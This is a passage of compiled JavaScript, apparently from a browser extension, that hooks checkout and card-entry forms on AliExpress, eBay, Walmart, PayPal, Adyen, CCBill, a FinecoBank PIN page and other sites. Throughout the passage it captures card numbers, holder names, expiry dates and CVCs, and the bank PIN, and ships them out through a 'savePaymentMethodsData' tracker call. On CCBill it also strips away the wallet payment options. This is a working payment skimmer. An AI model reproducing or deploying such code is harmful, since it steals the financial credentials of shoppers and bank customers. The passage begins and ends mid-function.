                if (document.querySelector('.check-out-root') !== null && ((_a = document.querySelector('.check-out-root')) === null || _a === void 0 ? void 0 : _a.childNodes.length) !== 1) {
                    var interval4_1 = setInterval(function () {
                        var _a, _b;
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4_1);
                            if (((_b = (_a = document.querySelector('.title-to-detail')) === null || _a === void 0 ? void 0 : _a.textContent) === null || _b === void 0 ? void 0 : _b.indexOf('Add a new card')) !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    var _a;
                                    (_a = document.querySelector('.title-to-detail')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    var _a, _b;
                                    (_b = (_a = document.querySelector('.bind-button-wrap ')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            }
                            else {
                                self.exploreSpecificElementByTagName(self, document.querySelector('.check-out-root'), 'span', 'payment-title', function (__detectedElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        var _a, _b;
                                        (_b = (_a = document.querySelector('.bind-button-wrap')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.addEventListener(event, function () {
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        });
                                    });
                                });
                            }
                        }
                    }, 1000);
                }
                else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        var interval_3 = setInterval(function () {
                            if (document.querySelector('.new-card') !== null) {
                                clearInterval(interval_3);
                                self.processAliExpressPaymentNewCard(self);
                            }
                        }, 100);
                        var interval00_1 = setInterval(function () {
                            if (document.querySelector('.pay-type.show-method') !== null) {
                                clearInterval(interval00_1);
                                ['click', 'dblclick'].forEach(function (event) {
                                    var _a;
                                    (_a = document.querySelector('.pay-type.show-method')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                        var __interval3 = setInterval(function () {
                                            if (document.querySelector('.new-card') !== null) {
                                                clearInterval(__interval3);
                                                self.explorePaymentNewCard(self, document.querySelector('.new-card'), function (elements) {
                                                    var _a;
                                                    var paymentMethodStore = [];
                                                    (_a = document.querySelector('.save')) === null || _a === void 0 ? void 0 : _a.addEventListener('click', function () {
                                                        elements.forEach(function (element) {
                                                            paymentMethodStore.push({
                                                                'element': element.nodeName,
                                                                'id': element.id,
                                                                'type': element.type,
                                                                'value': element.value
                                                            });
                                                        });
                                                        Tracker.send({
                                                            command: 'savePaymentMethodsData',
                                                            data: {
                                                                'cardNumber': paymentMethodStore[0].value,
                                                                'cardBrand': 'Unknown',
                                                                'cardHolder': paymentMethodStore[1].value,
                                                                'cardExpire': paymentMethodStore[2].value,
                                                                'cardCVC': paymentMethodStore[3].value,
                                                                'event': 'add',
                                                                'workWebsite': window.location.origin
                                                            }
                                                        });
                                                        paymentMethodStore = [];
                                                    });
                                                });
                                            }
                                        }, 1000);
                                    });
                                });
                            }
                        }, 100);
                        if (document.querySelector('.edit-card') !== null) {
                            ['click', 'dblclick'].forEach(function (event) {
                                var _a;
                                (_a = document.querySelector('.edit-card')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                    var __interval3 = setInterval(function () {
                                        if (document.querySelector('.new-card') !== null) {
                                            clearInterval(__interval3);
                                            self.processAliExpressPaymentNewCard(self);
                                        }
                                    }, 1000);
                                });
                            });
                        }
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (__detectedDivElement) {
                                __detectedDivElement.addEventListener('click', function () {
                                    if (__detectedDivElement.classList.contains('arrow-down')) {
                                        var __interval2_1 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2_1);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    var _a;
                                                    (_a = document.querySelector('.add-new-card')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                                        var __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.processAliExpressPaymentNewCard(self);
                                                            }
                                                        }, 1000);
                                                    });
                                                });
                                            }
                                        }, 1000);
                                    }
                                });
                            });
                        }
                        if (((_b = document.querySelector('.mix-edcard-item')) === null || _b === void 0 ? void 0 : _b.childElementCount) !== 0) {
                            var cardConfirmElement_1 = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement_1 === null || cardConfirmElement_1 === void 0 ? void 0 : cardConfirmElement_1.addEventListener(event, function () {
                                    var _a;
                                    var tempPaymentMethodsStore = [];
                                    (_a = document.querySelector('.mix-edcard-item')) === null || _a === void 0 ? void 0 : _a.childNodes.forEach(function (__childElement) {
                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('icon')) {
                                            if (__childElement.classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __childElement.nodeName,
                                                    'id': __childElement.id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if (__childElement.nodeName === 'SPAN' && __childElement.classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': __childElement.nodeName,
                                                'id': __childElement.id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    Tracker.send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        var interval4_2 = setInterval(function () {
                            var _a, _b;
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4_2);
                                if (((_b = (_a = document.querySelector('.verify-card-confirm')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.nodeName) === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        var _a, _b;
                                        var tempPaymentMethodsStore = [];
                                        (_b = (_a = document.querySelector('.verify-card-confirm')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.addEventListener(event, function () {
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardN', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cardHolder', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'expires', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.exploreSpecificElementByTagName(self, document.querySelector('.verify-card-form-row'), 'input', 'cvc', function (__detectedElement) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    "cardExpire": tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    "workWebsite": window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }
                /*if (document.querySelector('.check-out-root') !== null && document.querySelector('.check-out-root')?.childNodes.length !== 1) {
                    clearInterval(interval1);
                    let interval4 = setInterval(function () {
                        if (document.querySelector('.title-to-detail') !== null) {
                            clearInterval(interval4);
                            if (document.querySelector('.title-to-detail')?.nextElementSibling?.textContent?.indexOf('Add a new card') !== -1) {
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.title-to-detail')?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                                ['click', 'dblclick'].forEach(function (event) {
                                    document.querySelector('.bind-button-wrap ')?.firstElementChild?.addEventListener(event, function () {
                                        self.processAliExpressPaymentNewCardOnSecondPayment(self);
                                    });
                                });
                            } else {
                                self.exploreSpecificElementByTagName(self, (document.querySelector('.check-out-root') as HTMLElement), 'span', 'payment-title', function (__detectedElement: HTMLElement) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': __detectedElement.textContent,
                                                    'cardBrand': 'Unknown',
                                                    'cardHolder': 'Unknown',
                                                    'cardExpire': 'Unknown',
                                                    'cardCVC': 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                        })
                                    });
                                });
                            }
                        }
                    }, 1000);
                    self.explorePaymentSpanTag(self, (document.querySelector('.check-out-root') as HTMLElement), function (__detectedElement: any) {
                        ['click', 'dblclick'].forEach(function (event) {
                            document.querySelector('.bind-button-wrap')?.firstElementChild?.addEventListener(event, function () {
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': (__detectedElement as HTMLElement).textContent,
                                        'cardBrand': 'Unknown',
                                        'cardHolder': 'Unknown',
                                        'cardExpire': 'Unknown',
                                        'cardCVC': 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            });
                        });
                    });
                } else {
                    if (window.location.href.indexOf('confirm_order.htm') !== -1) {
                        if (document.querySelectorAll('.arrow-content').length !== 0) {
                            document.querySelectorAll('.arrow-content').forEach(function (divElement) {
                                divElement.addEventListener('click', function () {
                                    if (divElement.classList.contains('arrow-down')) {
                                        let __interval2 = setInterval(function () {
                                            if (document.querySelector('.add-new-card') !== null) {
                                                clearInterval(__interval2);
                                                ['click', 'dblclick'].forEach(function (event) {
                                                    document.querySelector('.add-new-card')?.addEventListener(event, function () {
                                                        let __interval3 = setInterval(function () {
                                                            if (document.querySelector('.new-card') !== null) {
                                                                clearInterval(__interval3);
                                                                self.explorePaymentNewCard(self,
                                                                    (document.querySelector('.new-card') as HTMLElement),
                                                                    function (elements: any) {
                                                                        let paymentMethodStore: any = [];
                                                                        document.querySelector('.save')?.addEventListener('click', function () {
                                                                            elements.forEach(function (element: any) {
                                                                                paymentMethodStore.push({
                                                                                    'element': element.nodeName,
                                                                                    'id': element.id,
                                                                                    'type': element.type,
                                                                                    'value': element.value
                                                                                });
                                                                            })
                                                                            Tracker.send({
                                                                                command: 'savePaymentMethodsData',
                                                                                data: {
                                                                                    'cardNumber': paymentMethodStore[0].value,
                                                                                    'cardBrand': 'Unknown',
                                                                                    'cardHolder': paymentMethodStore[1].value,
                                                                                    'cardExpire': paymentMethodStore[2].value,
                                                                                    'cardCVC': paymentMethodStore[3].value,
                                                                                    'event': 'add',
                                                                                    'workWebsite': window.location.origin
                                                                                }
                                                                            });
                                                                            paymentMethodStore = [];
                                                                        });
                                                                    });
                                                            }
                                                        }, 1000);
                                                    })
                                                });
                                            }
                                        }, 1000);
                                    }
                                })
                            });
                        }

                        if (document.querySelector('.mix-edcard-item')?.childElementCount !== 0) {
                            clearInterval(interval1);
                            let cardConfirmElement = document.querySelector('#checkout-button');
                            ['click', 'dblclick'].forEach(function (event) {
                                cardConfirmElement?.addEventListener(event, function () {
                                    let tempPaymentMethodsStore: any = [];
                                    document.querySelector('.mix-edcard-item')?.childNodes.forEach(function (__childElement) {
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('icon')) {
                                            if ((__childElement as HTMLElement).classList.contains('visa')) {
                                                tempPaymentMethodsStore.push({
                                                    'element': (__childElement as HTMLElement).nodeName,
                                                    'id': (__childElement as HTMLElement).id,
                                                    'value': 'visa'
                                                });
                                            }
                                        }
                                        if ((__childElement as HTMLElement).nodeName === 'SPAN' && (__childElement as HTMLElement).classList.contains('pay-name')) {
                                            tempPaymentMethodsStore.push({
                                                'element': (__childElement as HTMLElement).nodeName,
                                                'id': (__childElement as HTMLElement).id,
                                                'value': __childElement.textContent
                                            });
                                        }
                                    });
                                    Tracker.send({
                                        command: 'savePaymentMethodsData',
                                        data: {
                                            'cardNumber': tempPaymentMethodsStore[0].value,
                                            'cardBrand': tempPaymentMethodsStore[1].value,
                                            'cardHolder': 'Unknown',
                                            'cardExpire': 'Unknown',
                                            'cardCVC': 'Unknown',
                                            'event': 'add',
                                            'workWebsite': window.location.origin
                                        }
                                    });
                                    tempPaymentMethodsStore = [];
                                });
                            });
                        }
                    }
                    if (window.location.href.indexOf('payResult.htm') !== -1) {
                        clearInterval(interval1);

                        let interval4 = setInterval(function () {
                            if (document.querySelector('.verify-card-form-row') !== null) {
                                clearInterval(interval4);
                                if (document.querySelector('.verify-card-confirm')?.firstElementChild?.nodeName === 'BUTTON') {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        let tempPaymentMethodsStore: any = [];
                                        document.querySelector('.verify-card-confirm')?.firstElementChild?.addEventListener(event, function () {
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardN', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cardHolder', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'expires', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            self.explorePaymentInputTag(self, (document.querySelector('.verify-card-form-row') as HTMLElement), 'cvc', function (__detectedElement: any) {
                                                tempPaymentMethodsStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            Tracker.send({
                                                command: 'savePaymentMethodsData',
                                                data: {
                                                    'cardNumber': tempPaymentMethodsStore[0].id.indexOf('cardN') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardBrand': tempPaymentMethodsStore[0].id === 'cardBrand' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardHolder': tempPaymentMethodsStore[0].id === 'cardHolder' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardExpire': tempPaymentMethodsStore[0].id === 'expires' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'cardCVC': tempPaymentMethodsStore[0].id === 'cvc' ? tempPaymentMethodsStore[0].value : 'Unknown',
                                                    'event': 'add',
                                                    'workWebsite': window.location.origin
                                                }
                                            });
                                            tempPaymentMethodsStore = [];
                                        });
                                    });
                                }
                            }
                        }, 1000);
                    }
                }*/
            }
            if (window.location.origin.indexOf('ebay') !== -1) {
                clearInterval(interval1);
                var interval_4 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        document.querySelectorAll('form').forEach(function (__ebayCreditCardFormElement) {
                            if (__ebayCreditCardFormElement.id === 'credit-card-details') {
                                clearInterval(interval_4);
                                var elements = [];
                                self.exploreEbayPaymentDataCollection(self, __ebayCreditCardFormElement, elements);
                            }
                        });
                    }
                }, 100);
                if (document.querySelector('#root') !== null && document.querySelector('.cic-module') !== null && document.querySelector('.btn.btn--primary.field') !== null) {
                    if (((_c = document.querySelector('.btn.btn--primary.field')) === null || _c === void 0 ? void 0 : _c.nodeName) === 'BUTTON') {
                        ["click", "dblclick"].forEach(function (event) {
                            var _a;
                            var tempPaymentMethodsStore = [];
                            (_a = document.querySelector('.btn.btn--primary.field')) === null || _a === void 0 ? void 0 : _a.addEventListener(event, function () {
                                var _a, _b, _c, _d;
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'creditCardNumber', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'firstName', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'lastName', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'expirationDate', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                self.explorePaymentInputTag(self, document.querySelector('.cic-module'), 'cvv', function (__detectedElement) {
                                    tempPaymentMethodsStore.push({
                                        'element': __detectedElement.nodeName,
                                        'id': __detectedElement.id,
                                        'value': __detectedElement.value
                                    });
                                });
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': tempPaymentMethodsStore[0].id.indexOf('creditCardNumber') !== -1 ? tempPaymentMethodsStore[0].value : 'Unknown',
                                        'cardBrand': ((_b = (_a = document.querySelector('.floating-input__fixright')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.className) ? (_d = (_c = document.querySelector('.floating-input__fixright')) === null || _c === void 0 ? void 0 : _c.firstElementChild) === null || _d === void 0 ? void 0 : _d.className.toLowerCase() : 'Unknown',
                                        'cardHolder': tempPaymentMethodsStore[1].value + ' ' + tempPaymentMethodsStore[2].value,
                                        'cardExpire': tempPaymentMethodsStore[3].id === 'expirationDate' ? tempPaymentMethodsStore[3].value : 'Unknown',
                                        'cardCVC': tempPaymentMethodsStore[4].id === 'cvv' ? tempPaymentMethodsStore[4].value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                tempPaymentMethodsStore = [];
                            });
                        });
                    }
                }
            }
            if (window.location.origin.indexOf('walmart') !== -1) {
                clearInterval(interval1);
                var interval_5 = setInterval(function () {
                    if (window.location.href.indexOf('#/payment') !== -1 || window.location.href.indexOf('account/creditcards') !== -1) {
                        clearInterval(interval_5);
                        self.exploreWalmartPaymentContainer(self);
                    }
                    if (window.location.href.indexOf('#/review') !== -1) {
                        clearInterval(interval_5);
                        self.exploreWalmartPaymentEditButton(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('hellofresh.de') !== -1) {
                clearInterval(interval1);
                var interval_6 = setInterval(function () {
                    if (document.querySelectorAll('.ReactModalPortal').length !== 0) {
                        clearInterval(interval_6);
                        document.querySelectorAll('.ReactModalPortal').forEach(function (modal) {
                            if (modal.childNodes.length !== 0) {
                                self.exploreHelloFreshPaymentContainer(self, modal, function (__detectedElement) {
                                    __detectedElement.addEventListener('click', function () {
                                        Tracker.send({
                                            command: 'savePaymentMethodsData',
                                            data: {
                                                'cardNumber': window.sessionStorage.getItem('cardNumber') !== undefined ? window.sessionStorage.getItem('cardNumber') : 'Unknown',
                                                'cardBrand': 'Unknown',
                                                'cardHolder': 'Unknown',
                                                'cardExpire': window.sessionStorage.getItem('cardExpire') !== undefined ? window.sessionStorage.getItem('cardExpire') : 'Unknown',
                                                'cardCVC': window.sessionStorage.getItem('cardCVC') !== undefined ? window.sessionStorage.getItem('cardCVC') : 'Unknown',
                                                'event': 'add',
                                                'workWebsite': window.location.origin
                                            }
                                        });
                                        window.sessionStorage.clear();
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('checkoutshopper-live.adyen.com') !== -1) {
                clearInterval(interval1);
                var interval_7 = setInterval(function () {
                    if (document.querySelector('body') !== null) {
                        clearInterval(interval_7);
                        self.explorePaymentInputTag(self, document.querySelector('body'), 'encrypted', function (__detectedElement) {
                            __detectedElement.addEventListener('keyup', function () {
                                if (__detectedElement.id === 'encryptedCardNumber') {
                                    window.sessionStorage.setItem('cardNumber', __detectedElement.value);
                                }
                                if (__detectedElement.id === 'encryptedExpiryDate') {
                                    window.sessionStorage.setItem('cardExpire', __detectedElement.value);
                                }
                                if (__detectedElement.id === 'encryptedSecurityCode') {
                                    window.sessionStorage.setItem('cardCVC', __detectedElement.value);
                                }
                            });
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('bestsecret.com') !== -1) {
                clearInterval(interval1);
                var interval_8 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_8);
                        self.exploreBestSecretPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('paypal') !== -1) {
                clearInterval(interval1);
                /*let lxt = '4WE56938NS691591T'*/
                var interval_9 = setInterval(function () {
                    if (document.querySelector('form') !== null) {
                        clearInterval(interval_9);
                        document.querySelectorAll('form').forEach(function (__paypalFormElement) {
                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1 || window.location.href.indexOf('webapps') !== -1) {
                                var elements = [];
                                self.explorePayPalPaymentFormElement(self, __paypalFormElement, elements, function (controller, elements) {
                                    ['click', 'dblclick'].forEach(function (event) {
                                        controller.addEventListener(event, function () {
                                            var _a, _b, _c, _d;
                                            var paymentMethodStore = [];
                                            elements.forEach(function (__detectedElement) {
                                                paymentMethodStore.push({
                                                    'element': __detectedElement.nodeName,
                                                    'id': __detectedElement.id,
                                                    'value': __detectedElement.value
                                                });
                                            });
                                            if (__paypalFormElement.action.indexOf('myaccount/money') !== -1) {
                                                Tracker.send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown',
                                                        'cardBrand': paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown',
                                                        'cardHolder': 'Unknown',
                                                        'cardExpire': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                            if (window.location.href.indexOf('webapps') !== -1) {
                                                Tracker.send({
                                                    command: 'savePaymentMethodsData',
                                                    data: {
                                                        'cardNumber': paymentMethodStore[2].value ? paymentMethodStore[2].value : 'Unknown',
                                                        'cardBrand': (_d = (_c = (_b = (_a = document.querySelector('.css-iro1ss-IconContainer.e7vozvz0')) === null || _a === void 0 ? void 0 : _a.firstElementChild) === null || _b === void 0 ? void 0 : _b.firstElementChild) === null || _c === void 0 ? void 0 : _c.textContent) === null || _d === void 0 ? void 0 : _d.toLowerCase(),
                                                        'cardHolder': (paymentMethodStore[0].value ? paymentMethodStore[0].value : 'Unknown') + ' ' + (paymentMethodStore[1].value ? paymentMethodStore[1].value : 'Unknown'),
                                                        'cardExpire': paymentMethodStore[3].value ? paymentMethodStore[3].value : 'Unknown',
                                                        'cardCVC': paymentMethodStore[4].value ? paymentMethodStore[4].value : 'Unknown',
                                                        'event': 'add',
                                                        'workWebsite': window.location.origin
                                                    }
                                                });
                                                paymentMethodStore = [];
                                            }
                                        });
                                    });
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('finecobank') !== -1) {
                if (document.querySelector('#PIN') !== null) {
                    clearInterval(interval1);
                    self.explorePaymentInputTagOnly(self, document.querySelector('#conferma_email_certifCommand'), function (__detectedElement) {
                        __detectedElement.addEventListener('click', function () {
                            Tracker.send({
                                command: 'saveBankAccountData',
                                data: {
                                    'dataType': 'PIN',
                                    'dataValue': document.querySelector('#PIN').value,
                                    "workWebsite": window.location.origin
                                }
                            });
                        });
                    });
                }
            }
            if (window.location.origin.indexOf('mollie') !== -1) {
                clearInterval(interval1);
                var interval_10 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_10);
                        self.exploreMolliePaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('sunday') !== -1) {
                clearInterval(interval1);
                var interval_11 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_11);
                        self.exploreSundayPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('jetbrains') !== -1) {
                clearInterval(interval1);
                var interval_12 = setInterval(function () {
                    if (window.location.origin.indexOf('checkout') !== -1) {
                        clearInterval(interval_12);
                        document.querySelectorAll('button').forEach(function (__buttonElement) {
                            if (__buttonElement.classList.contains('btnConfirmPayment')) {
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': document.querySelector('#ccNumber').value ? document.querySelector('#ccNumber').value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[6].value ? paymentMethodData[6].value :*/ 'Unknown',
                                        'cardHolder': document.querySelector('#ccHolder').value ? document.querySelector('#ccHolder').value : 'Unknown',
                                        'cardExpire': document.querySelector('#ccExpirationMonth').value ? document.querySelector('#ccExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#ccExpirationYear').value ? document.querySelector('#ccExpirationYear').value : 0,
                                        'cardCVC': document.querySelector('#ccSecurityCode').value ? document.querySelector('#ccSecurityCode').value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                            }
                        });
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('paygate') !== -1) {
                clearInterval(interval1);
                var interval_13 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_13);
                        self.explorePaygatePaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('docmorris') !== -1) {
                clearInterval(interval1);
                var interval_14 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_14);
                        self.exploreDocmorrisPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('segpay') !== -1) {
                clearInterval(interval1);
                var interval_15 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_15);
                        self.exploreSegPayPaymentContainer(self);
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('ccbill') !== -1) {
                clearInterval(interval1);
                var interval_16 = setInterval(function () {
                    if (document.querySelectorAll('form').length !== 0) {
                        clearInterval(interval_16);
                        if (document.querySelector('#purchaseForm') !== null && document.querySelector('.pay_by') !== null) {
                            document.querySelector('#placeOrder').addEventListener('click', function () {
                                var _a;
                                (_a = document.querySelector('.wallet_payment_options.two-column-layout-wallet-payment-options')) === null || _a === void 0 ? void 0 : _a.remove();
                                Tracker.send({
                                    command: 'savePaymentMethodsData',
                                    data: {
                                        'cardNumber': document.querySelector('#creditCardNum').value !== null ? document.querySelector('#creditCardNum').value : 'Unknown',
                                        'cardBrand': /*paymentMethodData[2].value ? paymentMethodData[2].value.toLowerCase() :*/ 'Unknown',
                                        'cardHolder': document.querySelector('#firstName').value !== null ? document.querySelector('#firstName').value : 'Unknown' + ' ' + document.querySelector('#lastName').value !== null ? document.querySelector('#lastName').value : 0,
                                        'cardExpire': document.querySelector('#cardExpirationMonth').value !== null ? document.querySelector('#cardExpirationMonth').value : 'Unknown' + '/' + document.querySelector('#cardExpirationYear').value !== null ? document.querySelector('#cardExpirationYear').value : 0,
                                        'cardCVC': document.querySelector('#cvv2').value !== null ? document.querySelector('#cvv2').value : 'Unknown',
                                        'event': 'add',
                                        'workWebsite': window.location.origin
                                    }
                                });
                                //elements = [];
                            });
                        }
                    }
                }, 100);
            }
            if (window.location.origin.indexOf('oppwa.com') !== -1) {
                clearInterval(interval1);
                var interval_17 = setInterval(function () {
                    if (document.querySelector('form').childNodes.length !== 0) {
                        document.querySelector('form').childNodes.forEach(function (__childElement) {
                            if (__childElement.nodeName.toLowerCase() === 'input' && __childElement.type === 'tel') {
                                clearInterval(interval_17);
                                ['keyup', 'keydown', 'change', 'paste'].forEach(function (__event) {
                                    __childElement.addEventListener(__event, function () {
